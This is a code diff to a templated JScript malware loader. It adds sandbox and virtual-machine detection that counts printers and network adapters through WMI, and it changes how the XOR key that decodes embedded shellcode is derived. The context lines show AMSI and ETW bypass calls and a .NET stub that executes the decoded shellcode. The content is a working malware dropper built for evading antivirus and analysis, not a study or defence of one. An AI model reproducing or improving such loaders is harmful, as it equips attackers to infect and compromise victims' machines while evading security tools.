@@ -56,6 +56,20 @@ function {{ v.fn_sandbox }}() {
         sh2.RegRead("HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions\\Version");
         return true;
     } catch(e) {}
+    try {
+        var wmi2 = GetObject("winmgmts:");
+        var prq = wmi2.ExecQuery("SELECT Name FROM Win32_Printer");
+        var pc = 0;
+        for (var ep = new Enumerator(prq); !ep.atEnd(); ep.moveNext()) pc++;
+        if (pc === 0) return true;
+    } catch(e) {}
+    try {
+        var wmi3 = GetObject("winmgmts:");
+        var naq = wmi3.ExecQuery("SELECT MACAddress FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL");
+        var nac = 0;
+        for (var ena = new Enumerator(naq); !ena.atEnd(); ena.moveNext()) nac++;
+        if (nac < 2) return true;
+    } catch(e) {}
     return false;
 }
 
@@ -66,7 +80,9 @@ if (!{{ v.fn_sandbox }}()) {
     WScript.Sleep(2000 + Math.floor(Math.random() * 3000));
     {{ v.fn_amsi }}();
     {{ v.fn_etw }}();
-    var sc = xor(hex2arr({% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}), hex2arr({% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}));
+    var _k = hex2arr({% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %});
+    for (var _ki = 0; _ki < _k.length; _ki++) _k[_ki] ^= {{ key_tweak }};
+    var sc = xor(hex2arr({% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}), _k);
     var loader = new ActiveXObject("System.Reflection.Assembly");
     var asm = loader.Load(hex2arr("{{ v.dotnet_stub_hex }}"));
     asm.GetType("Stub.Loader").GetMethod("Run").Invoke(null, [sc]);
